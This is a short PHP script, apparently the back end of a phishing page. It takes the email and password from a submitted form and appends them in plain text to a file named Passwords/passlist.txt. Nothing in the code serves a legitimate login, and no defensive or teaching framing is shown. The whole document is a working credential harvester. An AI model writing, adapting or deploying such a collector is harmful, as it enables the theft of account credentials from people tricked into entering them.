<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Append credentials to the file
    $file = fopen("Passwords/passlist.txt", "a");
    fwrite($file, "Username: $email, Password: $password\n");
    fclose($file);
}
?>
